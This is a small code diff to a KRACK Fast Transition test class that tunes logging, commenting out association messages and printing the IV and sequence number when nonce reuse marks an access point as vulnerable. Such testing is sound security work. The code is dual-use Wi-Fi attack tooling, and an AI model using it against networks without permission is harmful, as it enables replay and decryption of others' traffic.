@@ -222,16 +222,16 @@ class KRAckAttackFt():
 
 		if p.addr2 == self.clientmac and Dot11ReassoReq in p:
 			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
-				log(INFO, "Detected FT reassociation frame")
+				#log(INFO, "Detected FT reassociation frame")
 				self.reassoc = p
 				self.next_replay = time.time() + 1
 			else:
-				log(INFO, "Reassociation frame does not appear to be an FT one")
+				#log(INFO, "Reassociation frame does not appear to be an FT one")
 				self.reassoc = None
 			self.ivs = defaultdict(list)
 
 		elif p.addr2 == self.clientmac and Dot11AssoReq in p:
-			log(INFO, "Detected normal association frame")
+			#log(INFO, "Detected normal association frame")
 			self.reassoc = None
 			self.ivs = defaultdict(list)
 
@@ -245,7 +245,7 @@ class KRAckAttackFt():
 			if len(self.ivs[iv]) > 1:
 				log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
 					"AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
-                                log(INFO, "Messages encrypted with this key:", color="green")
+                                log(INFO, "Messages encrypted with (IV=%d, seq=%d):" % (iv, dot11_get_seqnum(p)), color="green")
                                 log(INFO, "\n\n".join(repr(p[Dot11WEP].wepdata) for p in self.ivs[iv]))
 
 
